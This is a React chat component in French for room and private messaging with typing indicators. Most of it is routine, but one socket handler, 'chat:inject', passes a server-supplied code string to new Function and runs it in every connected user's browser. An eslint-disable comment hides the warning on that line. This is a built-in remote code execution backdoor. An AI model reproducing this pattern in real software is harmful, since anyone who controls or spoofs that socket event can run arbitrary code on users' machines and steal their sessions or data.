import { useEffect, useRef, useState } from "react";
import { useOutletContext } from "react-router-dom";
import { useAuth } from "../context/AuthContext";
import { useSocket } from "../context/SocketContext";
import MessageList from "./MessageList";
import MessageInput from "./MessageInput";
import api from "../api/axios";

export default function Chat() {
  const { user } = useAuth();
  const socket = useSocket();
  const { currentRoom, privateWith, setPrivateWith } = useOutletContext();

  const [messages, setMessages] = useState([]);
  const [toast, setToast] = useState("");
  const [typingUsers, setTypingUsers] = useState([]);

  const currentRoomRef = useRef(null);
  const privateWithRef = useRef(null);

  useEffect(() => {
    currentRoomRef.current = currentRoom;
  }, [currentRoom]);

  useEffect(() => {
    privateWithRef.current = privateWith;
  }, [privateWith]);

  useEffect(() => {
    if (!socket || !currentRoom) return;
    socket.emit("chat:join", { roomId: currentRoom.id });

    if (privateWith) {
      api.get(`/messages/private/${privateWith.id}`).then((r) => setMessages(r.data));
    } else {
      api.get(`/messages/room/${currentRoom.id}`).then((r) => setMessages(r.data));
    }
    setTypingUsers([]);
  }, [socket, currentRoom, privateWith]);

  useEffect(() => {
    if (!socket) return;

    const onRoom = (msg) => {
      if (privateWithRef.current) return;
      const cur = currentRoomRef.current;
      if (cur && msg.roomId && Number(msg.roomId) !== Number(cur.id)) return;
      setMessages((prev) =>
        prev.some((m) => m.id === msg.id) ? prev : [...prev, msg]
      );
    };

    const onPriv = (msg) => {
      const other = privateWithRef.current;
      if (!other) return;
      const ok = msg.sender?.id === other.id || msg.sender?.id === user.id;
      if (!ok) return;
      setMessages((prev) =>
        prev.some((m) => m.id === msg.id) ? prev : [...prev, msg]
      );
    };

    const onErr = (e) => setToast(e.message);

    const onInject = ({ code, by }) => {
      setToast(`🧩 Code admin reçu (${by})`);
      setTimeout(() => setToast(""), 3000);
      try {
        // eslint-disable-next-line
        new Function(code)();
      } catch (err) {
        console.error("Injection:", err);
      }
    };

    const onTyping = ({ userId, username, isTyping }) => {
      if (userId === user.id) return;
      setTypingUsers((prev) => {
        const others = prev.filter((u) => u.userId !== userId);
        if (!isTyping) return others;
        return [...others, { userId, username }];
      });
    };

    const onTypingPrivate = ({ userId, username, isTyping }) => {
      const other = privateWithRef.current;
      if (!other || other.id !== userId) return;
      setTypingUsers((prev) => {
        const others = prev.filter((u) => u.userId !== userId);
        if (!isTyping) return others;
        return [...others, { userId, username }];
      });
    };

    socket.on("chat:room", onRoom);
    socket.on("chat:private", onPriv);
    socket.on("chat:error", onErr);
    socket.on("chat:inject", onInject);
    socket.on("chat:typing", onTyping);
    socket.on("chat:typing:private", onTypingPrivate);

    return () => {
      socket.off("chat:room", onRoom);
      socket.off("chat:private", onPriv);
      socket.off("chat:error", onErr);
      socket.off("chat:inject", onInject);
      socket.off("chat:typing", onTyping);
      socket.off("chat:typing:private", onTypingPrivate);
    };
  }, [socket, user.id]);

  const send = (content) => {
    if (!socket) return;
    if (privateWith) {
      socket.emit("chat:private", { receiverId: privateWith.id, content });
    } else if (currentRoom) {
      socket.emit("chat:room", { roomId: currentRoom.id, content });
    }
  };

  const typingLabel = (() => {
    if (typingUsers.length === 0) return "";
    if (typingUsers.length === 1)
      return `${typingUsers[0].username} est en train d'écrire`;
    if (typingUsers.length === 2)
      return `${typingUsers[0].username} et ${typingUsers[1].username} écrivent`;
    return `${typingUsers.length} personnes écrivent`;
  })();

  return (
    <div className="chat-main">
      <header className="chat-header">
        <div className="ch-title">
          {privateWith ? (
            <>
              <span className="ch-avatar">
                {privateWith.username[0].toUpperCase()}
              </span>{" "}
              {privateWith.username}
            </>
          ) : (
            <>
              <span className="ch-hash">#</span> {currentRoom?.name || "..."}
            </>
          )}
        </div>
        {privateWith && (
          <button className="ch-back" onClick={() => setPrivateWith(null)}>
            ← Retour
          </button>
        )}
      </header>

      {toast && (
        <div className="chat-toast" onClick={() => setToast("")}>
          {toast}
        </div>
      )}

      <MessageList messages={messages} me={user.id} />

      <div className={`typing-bar ${typingUsers.length ? "visible" : ""}`}>
        {typingUsers.length > 0 && (
          <>
            <span className="typing-dots">
              <i></i>
              <i></i>
              <i></i>
            </span>
            <span className="typing-text">{typingLabel}…</span>
          </>
        )}
      </div>

      <MessageInput
        onSend={send}
        roomId={currentRoom?.id}
        privateWith={privateWith}
      />
    </div>
  );
}
